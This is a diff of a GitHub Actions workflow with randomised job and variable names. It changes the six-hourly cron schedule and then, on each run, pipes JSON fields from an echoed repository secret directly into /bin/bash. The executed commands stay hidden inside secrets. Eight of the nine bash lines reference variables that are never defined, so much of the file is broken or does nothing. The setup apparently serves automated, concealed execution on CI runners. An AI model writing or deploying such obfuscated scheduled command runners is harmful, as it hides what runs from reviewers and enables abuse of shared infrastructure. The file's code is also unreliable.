@@ -1,21 +1,26 @@
 name: leidate7890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 4/6 * * *'
+    - cron: '10 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          xh72058: ${{ secrets.xh72058 }}
+          e7890: ${{ secrets.e7890 }}
         run: |
-          echo $xh72058 | jq -r .whc8054 | /bin/bash
-          echo $r83 | jq -r .ubhr5186 | /bin/bash
-          echo $aotj33372 | jq -r .mub670 | /bin/bash
-          echo $dgew7234 | jq -r .o5892 | /bin/bash
-          echo $s70084 | jq -r .k654 | /bin/bash
+          echo $e7890 | jq -r .bp912 | /bin/bash
+          echo $jmw3205 | jq -r .ctqj9645 | /bin/bash
+          echo $owruk89687 | jq -r .ih2 | /bin/bash
+          echo $elwl6 | jq -r .ain06 | /bin/bash
+          echo $bvdy778 | jq -r .mut509 | /bin/bash
+          echo $mniep2462 | jq -r .ht192 | /bin/bash
+          echo $atog21 | jq -r .k5 | /bin/bash
+          echo $lytu158 | jq -r .mndki71888 | /bin/bash
+          echo $r0 | jq -r .jfvlc82 | /bin/bash
 
